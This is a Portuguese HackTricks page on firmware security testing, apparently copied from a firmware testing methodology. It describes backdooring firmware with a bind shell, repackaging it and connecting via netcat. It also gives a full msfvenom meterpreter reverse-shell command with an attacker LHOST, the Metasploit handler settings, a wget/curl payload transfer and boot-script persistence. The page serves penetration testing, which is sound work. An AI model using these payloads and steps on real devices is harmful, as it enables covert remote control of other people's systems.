<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


### Esta página foi copiada de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Tente **fazer upload de firmware personalizado e/ou binários compilados** para verificar falhas de integridade ou assinatura. Por exemplo, compile um backdoor bind shell que inicie na inicialização usando os seguintes passos.

1. Extraia o firmware com o firmware-mod-kit (FMK)
2. Identifique a arquitetura e a endianness do firmware alvo
3. Construa um compilador cruzado com o Buildroot ou use outros métodos que se adequem ao seu ambiente
4. Use o compilador cruzado para construir o backdoor
5. Copie o backdoor para o /usr/bin do firmware extraído
6. Copie o binário QEMU apropriado para o rootfs do firmware extraído
7. Emule o backdoor usando chroot e QEMU
8. Conecte-se ao backdoor via netcat
9. Remova o binário QEMU do rootfs do firmware extraído
10. Reempacote o firmware modificado com o FMK
11. Teste o firmware com backdoor emulando com o firmware analysis toolkit (FAT) e conectando-se ao IP e porta do backdoor alvo usando netcat

Se um shell root já foi obtido a partir de análise dinâmica, manipulação do bootloader ou testes de segurança de hardware, tente executar binários maliciosos pré-compilados como implantes ou reverse shells. Considere usar ferramentas automatizadas de payload/implante usadas para frameworks de comando e controle (C&C). Por exemplo, o framework Metasploit e o ‘msfvenom’ podem ser aproveitados usando os seguintes passos.

1. Identifique a arquitetura e a endianness do firmware alvo
2. Use `msfvenom` para especificar o payload alvo apropriado (-p), IP do host atacante (LHOST=), número da porta de escuta (LPORT=), tipo de arquivo (-f), arquitetura (--arch), plataforma (--platform linux ou windows) e o arquivo de saída (-o). Por exemplo, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. Transfira o payload para o dispositivo comprometido (por exemplo, execute um servidor web local e use wget/curl para transferir o payload para o sistema de arquivos) e garanta que o payload tenha permissões de execução
4. Prepare o Metasploit para lidar com solicitações de entrada. Por exemplo, inicie o Metasploit com msfconsole e use as seguintes configurações de acordo com o payload acima: use exploit/multi/handler,
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #IP do host atacante`
* `set LPORT 445 #pode ser qualquer porta não utilizada`
* `set ExitOnSession false`
* `exploit -j -z`
5. Execute o meterpreter reverse 🐚 no dispositivo comprometido
6. Observe as sessões do meterpreter se abrindo
7. Realize atividades de pós-exploração

Se possível, identifique uma vulnerabilidade dentro dos scripts de inicialização para obter acesso persistente a um dispositivo após reinicializações. Tais vulnerabilidades surgem quando scripts de inicialização referenciam, [linkam simbolicamente](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), ou dependem de código localizado em locais montados não confiáveis, como cartões SD e volumes flash usados para armazenar dados fora dos sistemas de arquivos raiz.


<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
